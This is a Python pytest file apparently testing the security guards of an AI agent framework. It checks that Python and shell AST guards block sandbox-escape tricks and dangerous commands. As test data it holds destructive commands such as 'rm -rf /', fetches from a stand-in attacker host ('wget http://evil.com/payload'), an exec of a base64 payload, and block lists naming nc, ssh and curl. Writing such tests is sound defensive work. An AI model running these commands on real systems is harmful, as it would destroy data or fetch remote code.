"""INVARIANT 7 — AST guards cannot be bypassed by encoding tricks.

The Python and Shell AST guards must catch dangerous patterns even
when expressed through known bypass techniques.
"""

from __future__ import annotations

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from cognithor.security.python_ast_guard import is_safe_python
from cognithor.security.shell_ast_guard import is_safe_shell

pytestmark = pytest.mark.security_contract


# ===========================================================================
# Python AST Guard
# ===========================================================================


def test_getattr_import_bypass():
    """getattr(__builtins__, '__import__')('os') must be caught."""
    code = "getattr(__builtins__, '__import__')('os')"
    assert not is_safe_python(code)


def test_dunder_import_call():
    """__import__('os') must be caught."""
    code = "__import__('os')"
    assert not is_safe_python(code)


def test_exec_call():
    """exec(...) must always be caught."""
    code = "exec('print(1)')"
    assert not is_safe_python(code)


def test_eval_call():
    """eval(...) must always be caught."""
    code = "eval('1+1')"
    assert not is_safe_python(code)


def test_compile_call():
    """compile(...) must always be caught."""
    code = "compile('print(1)', '<string>', 'exec')"
    assert not is_safe_python(code)


def test_import_os():
    """import os must be caught."""
    code = "import os"
    assert not is_safe_python(code)


def test_from_os_import():
    """from os import system must be caught."""
    code = "from os import system"
    assert not is_safe_python(code)


def test_import_subprocess():
    """import subprocess must be caught."""
    code = "import subprocess"
    assert not is_safe_python(code)


def test_import_pickle():
    """import pickle must be caught (deserialization attack vector)."""
    code = "import pickle"
    assert not is_safe_python(code)


def test_import_ctypes():
    """import ctypes must be caught (FFI)."""
    code = "import ctypes"
    assert not is_safe_python(code)


def test_dunder_subclasses_strict():
    """().__class__.__bases__[0].__subclasses__() must be caught in strict mode."""
    code = "().__class__.__bases__[0].__subclasses__()"
    assert not is_safe_python(code, strict=True)


def test_exec_with_encoded_payload():
    """exec(base64.b64decode(...)) — exec is caught regardless of arguments."""
    code = "exec(__import__('base64').b64decode(b'cHJpbnQoMSk='))"
    assert not is_safe_python(code)


def test_setattr_bypass():
    """setattr(module, 'system', ...) on dangerous module must be caught."""
    code = "import os; setattr(os, 'listdir', lambda: None)"
    assert not is_safe_python(code)


def test_globals_call():
    """globals() must be caught."""
    code = "globals()"
    assert not is_safe_python(code)


def test_locals_call():
    """locals() must be caught."""
    code = "locals()"
    assert not is_safe_python(code)


def test_safe_code_passes():
    """Normal safe code must not trigger violations."""
    code = "x = [1, 2, 3]\nresult = sum(x)\nprint(result)"
    assert is_safe_python(code)


def test_syntax_error_is_unsafe():
    """Unparseable code is treated as unsafe."""
    assert not is_safe_python("def (broken syntax")


# ===========================================================================
# Shell AST Guard
# ===========================================================================


def test_shell_rm_blocked():
    """rm must be blocked."""
    assert not is_safe_shell("rm -rf /tmp/test")


def test_shell_path_prefix_bypass():
    """/usr/bin/rm must be stripped to rm and blocked."""
    assert not is_safe_shell("/usr/bin/rm -rf /tmp/test")


def test_shell_command_substitution():
    """echo $(rm -rf /) must catch the substitution."""
    assert not is_safe_shell("echo $(rm -rf /)")


def test_shell_pipe_to_blocked():
    """cat file | python must catch the pipe + python."""
    assert not is_safe_shell("cat file | python")


def test_shell_semicolon_chain():
    """ls; rm -rf / must catch the chained operator."""
    assert not is_safe_shell("ls; rm -rf /")


def test_shell_and_chain():
    """ls && rm -rf / must catch the && operator."""
    assert not is_safe_shell("ls && rm -rf /")


def test_shell_or_chain():
    """ls || rm -rf / must catch the || operator."""
    assert not is_safe_shell("ls || rm -rf /")


def test_shell_wget_blocked():
    """wget must be blocked."""
    assert not is_safe_shell("wget http://evil.com/payload")


def test_shell_curl_blocked():
    """curl must be blocked."""
    assert not is_safe_shell("curl http://evil.com/payload")


def test_shell_sudo_blocked():
    """sudo must be blocked."""
    assert not is_safe_shell("sudo ls")


def test_shell_chmod_blocked():
    """chmod must be blocked."""
    assert not is_safe_shell("chmod 777 /tmp/test")


def test_shell_python_blocked():
    """python interpreter must be blocked."""
    assert not is_safe_shell("python -c 'import os; os.system(\"id\")'")


def test_shell_backtick_substitution():
    """Backtick command substitution must be caught."""
    assert not is_safe_shell("echo `whoami`")


def test_shell_safe_command_passes():
    """ls, echo, cat etc should be safe."""
    assert is_safe_shell("ls")
    assert is_safe_shell("echo hello")


# ===========================================================================
# Hypothesis: random dangerous payloads
# ===========================================================================


DANGEROUS_MODULES = [
    "os",
    "sys",
    "subprocess",
    "shutil",
    "pickle",
    "marshal",
    "ctypes",
    "socket",
    "importlib",
    "multiprocessing",
]


@given(module=st.sampled_from(DANGEROUS_MODULES))
@settings(max_examples=30)
def test_fuzz_python_import_always_caught(module):
    """import <dangerous_module> must always be caught."""
    assert not is_safe_python(f"import {module}")
    assert not is_safe_python(f"from {module} import *")


BLOCKED_COMMANDS = [
    "rm",
    "wget",
    "curl",
    "sudo",
    "chmod",
    "chown",
    "python",
    "python3",
    "bash",
    "sh",
    "nc",
    "ssh",
    "kill",
    "reboot",
    "shutdown",
    "dd",
    "mkfs",
    "crontab",
]


@given(cmd=st.sampled_from(BLOCKED_COMMANDS))
@settings(max_examples=30)
def test_fuzz_shell_blocked_commands_always_caught(cmd):
    """Blocked shell commands must always be caught, with or without path prefix."""
    assert not is_safe_shell(cmd)
    assert not is_safe_shell(f"/usr/bin/{cmd}")
    assert not is_safe_shell(f"/usr/local/bin/{cmd}")
